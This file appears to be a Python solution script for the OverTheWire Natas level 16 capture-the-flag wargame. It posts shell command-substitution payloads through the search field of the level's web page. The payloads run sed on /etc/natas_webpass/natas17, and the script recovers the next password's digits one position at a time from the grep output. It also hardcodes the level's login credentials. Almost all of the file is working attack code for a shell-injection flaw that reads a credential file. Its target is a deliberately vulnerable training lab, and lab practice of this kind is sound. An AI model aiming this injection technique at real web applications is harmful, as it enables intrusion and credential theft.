from pathlib import Path
import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup as bs

n2c = 'jabcdefghi'
c2n = '1234567890'
sed_expr = r'-e s/1/a/g -e s/2/b/g -e s/3/c/g -e s/4/d/g -e s/5/e/g -e s/6/f/g -e s/7/g/g -e s/8/h/g -e s/9/i/g -e s/0/j/g'

def gensed(pos, lng):
    pos = pos - 1
    return rf'$(sed {sed_expr} -e s/^{"."*pos}// -e s/{"."*(lng-pos-1)}\$// /etc/natas_webpass/natas17)'

cs = Path('singles.txt').read_text().split()

print(cs)

with requests.Session() as s:
    auth = HTTPBasicAuth('natas16', 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V')
    url = 'http://natas16.natas.labs.overthewire.org'
    
    for i in range(1, 32+1):
        if cs[i-1] != 'NUM': continue

        r = s.post(url, auth=auth, data={'needle': gensed(i, 32)})

        # print(bs(r.content).prettify())

        l = list(
            bs(r.content).find('div', id='content').find('pre').next.splitlines()
        )

        print(len(l))

        assert(len(l) > 1)
        st = set(l[1].lower())
        for w in l[2:]:
            st = st & set(w.lower())
        assert(len(st) == 1)
        single = list(st)[0]
        
        n = c2n[ord(single) - ord('a')]
        print(f'{i} [{single}]: {n}')

